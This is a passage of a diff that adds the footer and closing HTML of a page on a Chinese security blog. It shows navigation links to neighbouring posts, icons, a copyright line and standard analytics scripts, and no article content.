+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">【漏洞】phpmps 2.0 GBK 0day</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/167/">
+            <span class="next-text nav-default">全套手机秘籍/手机指令</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="mailto:root@lcx.cc" rel="me noopener" class="iconfont"
+      title="email" >
+      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="linkedin"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="33" height="33">
+  <path d="M872.405333 872.618667h-151.637333v-237.610667c0-56.661333-1.152-129.578667-79.018667-129.578667-79.061333 0-91.136 61.653333-91.136 125.397334v241.792H398.976V384h145.664v66.602667h1.962667c20.352-38.4 69.845333-78.933333 143.786666-78.933334 153.642667 0 182.058667 101.12 182.058667 232.746667v268.202667zM227.712 317.141333a87.978667 87.978667 0 0 1-88.021333-88.106666 88.064 88.064 0 1 1 88.021333 88.106666z m76.032 555.477334H151.68V384h152.064v488.618667zM948.266667 0H75.562667C33.792 0 0 33.024 0 73.770667v876.458666C0 991.018667 33.792 1024 75.562667 1024h872.576C989.866667 1024 1024 991.018667 1024 950.229333V73.770667C1024 33.024 989.866667 0 948.138667 0h0.128z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="weibo"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M385.714286 733.714286q12-19.428571 6.285714-39.428571t-25.714286-28.571429q-19.428571-8-41.714286-0.571429t-34.285714 26.285714q-12.571429 19.428571-7.428571 39.142857t24.571429 28.857143 42.571429 1.428571 35.714286-27.142857zm53.714286-69.142857q4.571429-7.428571 2-15.142857t-10-10.571429q-8-2.857143-16.285714 2.857143t-12.285714 10.571429q-9.714286 17.714286 7.428571 25.714286 8 2.857143 16.571429 2.857143t12.571429-10.571429zm99.428571 61.142857q-25.714286 58.285714-90.285714 85.714286t-128 6.857143q-61.142857-19.428571-84.285714-72.285714t3.714286-107.142857q26.857143-53.142857 86.571429-79.428571t120.285714-10.857143q63.428571 16.571429 90.571429 68.285714t1.428571 108.857143zm178.285714-91.428571q-5.142857-54.857143-50.857143-97.142857t-119.142857-62.285714-156.857143-12q-127.428571 13.142857-211.142857 80.857143t-75.714286 151.142857q5.142857 54.857143 50.857143 97.142857t119.142857 62.285714 156.857143 12q127.428571-13.142857 211.142857-80.857143t75.714286-151.142857zm176 2.285714q0 38.857143-21.142857 79.714286t-62.285714 78.285714-96.285714 67.142857-129.142857 47.428571-154.571429 17.714286-157.142857-19.142857-137.428571-53.142857-98-86.285714-37.142857-114q0-65.714286 39.714286-140t112.857143-147.428571q96.571429-96.571429 195.142857-134.857143t140.857143 4q37.142857 36.571429 11.428571 119.428571-2.285714 8-0.571429 11.428571t5.714286 4 8.285714 2.857143 7.714286-2l3.428571-1.142857q79.428571-33.714286 140.571429-33.714286t87.428571 34.857143q25.714286 36 0 101.714286-1.142857 7.428571-2.571429 11.428571t2.571429 7.142857 6.857143 4.285714 9.714286 3.428571q32.571429 10.285714 58.857143 26.857143t45.714286 46.571429 19.428571 66.571429zm-42.285714-356.571429q24 26.857143 31.142857 62t-3.714286 67.142857q-4.571429 13.142857-16.857143 19.428571t-25.428571 2.285714q-13.142857-4.571429-19.428571-16.857143t-2.285714-25.428571q11.428571-36-13.714286-63.428571t-61.142857-20q-13.714286 2.857143-25.714286-4.571429t-14.285714-21.142857q-2.857143-13.714286 4.571429-25.428571t21.142857-14.571429q34.285714-7.428571 68 3.142857t57.714286 37.428571zm103.428571-93.142857q49.714286 54.857143 64.285714 127.142857t-7.714286 138q-5.142857 15.428571-19.428571 22.857143t-29.714286 2.285714-22.857143-19.428571-2.857143-29.714286q16-46.857143 5.714286-98.285714t-45.714286-90.285714q-35.428571-39.428571-84.571429-54.571429t-98.857143-4.857143q-16 3.428571-29.714286-5.428571t-17.142857-24.857143 5.428571-29.428571 24.857143-16.857143q70.285714-14.857143 139.428571 6.571429t118.857143 76.857143z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="douban"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M926.917973 37.80608C959.65184 37.80608 986.19392 64.34816 986.19392 97.082027L986.19392 926.917973C986.19392 959.65184 959.65184 986.19392 926.917973 986.19392L97.082027 986.19392C64.34816 986.19392 37.80608 959.65184 37.80608 926.917973L37.80608 97.082027C37.80608 64.34816 64.34816 37.80608 97.082027 37.80608zM176.653653 176.19968 176.653653 252.678827 825.658027 252.678827 825.658027 176.19968zM217.719467 316.146347 217.719467 628.08064 273.524053 628.08064 341.292373 770.39616 157.259093 770.39616 157.259093 845.417813 842.949973 845.417813 842.949973 770.39616 654.226773 770.39616 722.899627 628.08064 783.67744 628.08064 783.67744 316.146347zM684.885333 392.891733 684.885333 553.987413 312.576 553.987413 312.576 392.891733zM570.770773 770.39616 426.653013 770.39616 359.621973 628.08064 639.443627 628.08064z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://lcx.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+
+  
+
+  <span class="copyright-year">
+    &copy;
+    
+      2010 -
+    2025
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        Nuclear'Atk（核攻击）网络安全实验室
+        
+      </span></span>
+
+  
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+<script id="baidu_analytics">
+  var _hmt = _hmt || [];
+  (function() {
+    if (window.location.hostname === 'localhost') return;
+    var hm = document.createElement("script"); hm.async = true;
+    hm.src = "https://hm.baidu.com/hm.js?90a2a7fb2c0fa46d3747ec9668f12a39";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+<script id="baidu_push">
+  (function(){
+    if (window.location.hostname === 'localhost') return;
+    var bp = document.createElement('script'); bp.async = true;
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/my.js"></script>
+
+
+</body>
+</html>
